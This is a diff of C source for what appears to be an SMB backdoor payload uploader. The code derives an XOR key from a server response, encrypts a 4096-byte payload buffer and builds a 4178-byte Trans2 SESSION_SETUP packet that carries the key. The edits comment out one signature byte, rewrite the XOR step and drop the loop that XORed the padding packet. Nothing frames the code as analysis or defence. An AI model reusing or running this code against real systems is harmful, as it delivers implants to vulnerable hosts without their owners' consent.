@@ -160,7 +160,9 @@ int main(int argc, char* argv[])
 	signature[1] = recvbuff[19];
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
-	signature[4] = recvbuff[22];
+	
+	//this is for determining architecture
+	//signature[4] = recvbuff[22];
 	
 	//convert the signature buffer to unsigned integer 
 	memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
@@ -270,7 +272,7 @@ int main(int argc, char* argv[])
 	//Xor the data buffer with the calculated key
 	for(i=0;i<4096;i++)
 	{
-		encrypted[i] = encrypted[i] ^ XorKey;
+		encrypted[i] ^= XorKey;
         }
 
 	//build packet buffer with 4178 bytes in length
@@ -279,11 +281,6 @@ int main(int argc, char* argv[])
 	//Then fill the packet with 0x00s and XOR it with the calculated key
 	unsigned char *big_packet = (unsigned char*)malloc(4178+1);
 	memset(big_packet, 0x00, 4178);
-	int bp;
-	for(bp=0;bp<4178;bp++)
-	{
-		big_packet[bp] = big_packet[bp] ^ XorKey;
-        }
 
 	//will use for re-sending the computed XOR key in the Trans2 SESSION_SETUP data parameters
 	unsigned char CHAR_XOR_KEY[4];
